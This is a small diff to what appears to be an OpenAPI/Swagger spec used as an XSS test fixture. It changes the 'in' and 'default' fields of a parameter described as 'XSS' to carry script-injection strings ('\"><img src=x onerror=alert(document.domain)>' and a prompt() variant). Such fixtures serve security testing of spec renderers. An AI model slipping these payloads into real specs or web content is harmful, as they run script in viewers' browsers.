@@ -12,8 +12,8 @@ paths:
       parameters:
         - description: XSS
           type: string
-          in: \"><img src=x onerror=alert()>
-          default: \"><img src=x onerror=prompt()>
+          in: \"><img src=x onerror=alert(document.domain)>
+          default: \"><img src=x onerror=prompt(document.domain)>
       responses:
         '200':
           description: No response was specified
